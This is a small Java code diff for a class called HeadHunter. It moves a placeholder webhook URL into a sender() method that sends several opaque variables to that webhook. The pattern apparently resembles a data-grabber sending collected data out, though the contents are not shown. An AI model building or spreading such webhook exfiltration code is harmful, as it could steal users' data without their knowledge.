@@ -15,7 +15,6 @@ public class HeadHunter {
     public static URL webhook;
 
     public static void main(String[] args) throws MalformedURLException, IOException {
-        webhook = new URL("imagine a url here");
         int h = 0;
         switch (h) {
             case 10:
@@ -204,6 +203,7 @@ public class HeadHunter {
     }
 
     public static void sender() throws IOException {
+        webhook = new URL("imagine url here");
         send(webhook, var1_8);
         send(webhook, var1_1);
         send(webhook, var1_2);
